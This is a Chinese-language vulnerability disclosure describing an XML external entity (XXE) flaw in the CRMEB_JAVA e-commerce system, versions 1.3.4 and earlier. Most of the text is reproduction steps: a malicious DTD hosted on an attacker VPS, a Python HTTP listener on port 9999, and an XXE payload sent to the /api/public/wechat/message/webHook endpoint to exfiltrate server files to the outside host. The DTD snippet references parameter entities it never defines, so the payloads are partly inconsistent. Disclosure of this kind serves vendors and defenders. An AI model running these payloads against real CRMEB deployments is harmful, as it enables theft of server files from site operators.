
## 漏洞描述

厂商：CRMEB属于西安众邦网络科技有限公司旗下品牌（[https://www.crmeb.com](https://gitee.com/link?target=https%3A%2F%2Fwww.crmeb.com)），众邦科技力致于利用互联网技术助力企业发展，国家富强，目前主要从事CRMEB客户管理+电商系统、CRMEB知识付费系统、企业管理系统等系统研发，凭借着我们漂亮的UI、高效整洁的代码、优质的服务、超实惠的授权价格快速获得广大用户的热爱和支持。

产品： CRMEB_JAVA电商系统
版本：<=1.3.4
项目地址：https://gitee.com/ZhongBangKeJi/crmeb_java

## 漏洞复现
在远程 VPS 中创建一个 DTD 文件，其中包含以下内容：
```
<!DOCTYPE convert [  
<!ENTITY % remote SYSTEM "http://vps:9999/Note.dtd">%remote;%int;%send;]>
```

然后启用 python 临时服务器监听 9999 端口
```
python -m http.server 9999
```

让我们在本地文件系统中创建一个内容为 flagflag 的新flag.txt
payload:
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "http://vps:9999" >
]>
<name>&xxe;</name>
```

访问漏洞接口/api/public/wechat/message/webHook

![image.png](https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20250303181528.png)

成功xxe外带数据

